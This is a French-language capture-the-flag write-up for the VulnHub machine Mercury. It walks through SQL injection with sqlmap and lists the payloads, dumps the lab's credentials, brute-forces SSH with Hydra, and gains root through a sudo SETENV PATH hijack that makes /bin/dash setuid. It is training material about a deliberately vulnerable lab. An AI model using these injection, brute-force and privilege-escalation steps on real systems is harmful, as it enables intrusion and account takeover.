---
title: "Solution du CTF Mercury de VulnHub"
tags: [CTF, VulnHub]
---

[Mercury](https://vulnhub.com/entry/the-planets-mercury,544/) est un des épisodes de la série de CTF créé par [SirFlash](https://vulnhub.com/author/sirflash,731/) et disponible sur *VulnHub*. J'ai déjà résolu le CTF [Earth]({% link _posts/2021-12-27-Solution-du-CTF-Earth-de-VulnHub.md %}).

```
Host is up (0.0067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2
```

## Freddie

On a donc une appli Python qui tourne sur le port 8080. Quand on demande une page qui n'existe pas on obtient pas mal de détails, car un mode debug est activé :

> Using the URLconf defined in `mercury_proj.urls`, Django tried these URL patterns, in this order:
> 
> 1. [name='index']
> 2. robots.txt [name='robots']
> 3. mercuryfacts/
> 
> The current path, `zz`, didn't match any of these.
> 
> You're seeing this error because you have `DEBUG = True` in your Django settings file. Change that to `False`, and Django will display a standard 404 page.

C'est suffisant pour nous permettre de trouver le chemin `mercuryfacts`. Cette URL prend en paramètre un identifiant numérique correspondant à un fait relatif à la planète Mercure.

`http://192.168.56.176:8080/mercuryfacts/1/`

Si on remplace le `1` par une apostrophe, on obtient un message d'erreur :

> ##### ProgrammingError at /mercuryfacts/'/
> 
> (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1")

Là encore on obtient un traceback qui indique que le code Python est lancé depuis le dossier `/home/webmaster/mercury_proj`.

`SQLmap` ne rencontre aucune difficulté à exploiter l'injection présente dans l'URL :

```bash
python sqlmap.py -u "http://192.168.56.176:8080/mercuryfacts/1*/" --dbms mysql --risk 3 --level 5
```

Aucun filtre `tamper` à utiliser donc. L'appli permet même l'injection de stacked queries :

```
sqlmap identified the following injection point(s) with a total of 44 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://192.168.56.176:8080/mercuryfacts/1 AND 9064=9064/
    Vector: AND [INFERENCE]

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: http://192.168.56.176:8080/mercuryfacts/1 AND GTID_SUBSET(CONCAT(0x717a6b6b71,(SELECT (ELT(7152=7152,1))),0x7178707871),7152)/
    Vector: AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: http://192.168.56.176:8080/mercuryfacts/1;SELECT SLEEP(5)#/
    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://192.168.56.176:8080/mercuryfacts/1 AND (SELECT 9388 FROM (SELECT(SLEEP(5)))RfdF)/
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: http://192.168.56.176:8080/mercuryfacts/1 UNION ALL SELECT CONCAT(0x717a6b6b71,0x46784b4674466668594d76704455596e5366694962754f6f4e74507946704f6948634d6e58544f6c,0x7178707871)-- -/
    Vector:  UNION ALL SELECT [QUERY]-- -
---
```

Je trouve dans la base `mercury` deux tables :

```
Database: mercury
[2 tables]
+-------+
| facts |
| users |
+-------+
```

Dont une avec des identifiants :

```
Database: mercury
Table: users
[4 entries]
+----+-----------+-------------------------------+
| id | username  | password                      |
+----+-----------+-------------------------------+
| 1  | john      | johnny1987                    |
| 2  | laura     | lovemykids111                 |
| 3  | sam       | lovemybeer111                 |
| 4  | webmaster | mercuryisthesizeof0.056Earths |
+----+-----------+-------------------------------+
```

## Ford

On peut mettre les utilisateurs et passwords dans des fichiers et tester ça avec `THC Hydra` :

```bash
hydra -L /tmp/users.txt -P /tmp/pass.txt -e nsr ssh://192.168.56.176
```

Sans trop de surprise on casse le compte `webmaster` :

```
[22][ssh] host: 192.168.56.176   login: webmaster   password: mercuryisthesizeof0.056Earths
```

L'utilisateur dispose du premier flag :

```console
webmaster@mercury:~$ ls -l
total 8
drwxrwxr-x 5 webmaster webmaster 4096 Aug 28  2020 mercury_proj
-rw------- 1 webmaster webmaster   45 Sep  1  2020 user_flag.txt
webmaster@mercury:~$ cat user_flag.txt
[user_flag_8339915c9a454657bd60ee58776f4ccd]
```

Mais surtout dans le dossier `mercury_proj` on trouve un fichier texte avec des mots de passe encodés en base64 :

> Project accounts (both restricted):  
> webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK  
> linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==

On peut alors de connecter avec le compte `linuxmaster` :

```console
webmaster@mercury:~/mercury_proj$ echo bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg== | base64 -d
mercurymeandiameteris4880km
webmaster@mercury:~/mercury_proj$ su linuxmaster
Password: 
linuxmaster@mercury:/home/webmaster/mercury_proj$ id
uid=1002(linuxmaster) gid=1002(linuxmaster) groups=1002(linuxmaster),1003(viewsyslog)
linuxmaster@mercury:/home/webmaster/mercury_proj$ cd
linuxmaster@mercury:~$ sudo -l
[sudo] password for linuxmaster: 
Matching Defaults entries for linuxmaster on mercury:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh
```

## Thermomètre

La mention de `SETENV` dans la ligne du `sudoers` indique que l'on peut définir les variables d'environnement pour l'application qui sera lancée.

Par conséquent, le fonctionnement se rapproche de l'exécution d'un binaire setuid :

```console
linuxmaster@mercury:~$ echo -e '#!/bin/bash\nchmod 4755 /bin/dash' > tail
linuxmaster@mercury:~$ chmod +x tail
linuxmaster@mercury:~$ sudo PATH=.:$PATH /usr/bin/check_syslog.sh
linuxmaster@mercury:~$ ls -l /bin/dash 
-rwsr-xr-x 1 root root 129816 Jul 18  2019 /bin/dash
linuxmaster@mercury:~$ /bin/dash -p
# id
uid=1002(linuxmaster) gid=1002(linuxmaster) euid=0(root) groups=1002(linuxmaster),1003(viewsyslog)
# cd /root
# ls
root_flag.txt
# cat root_flag.txt
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Congratulations on completing Mercury!!!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_69426d9fda579afbffd9c2d47ca31d90]
```


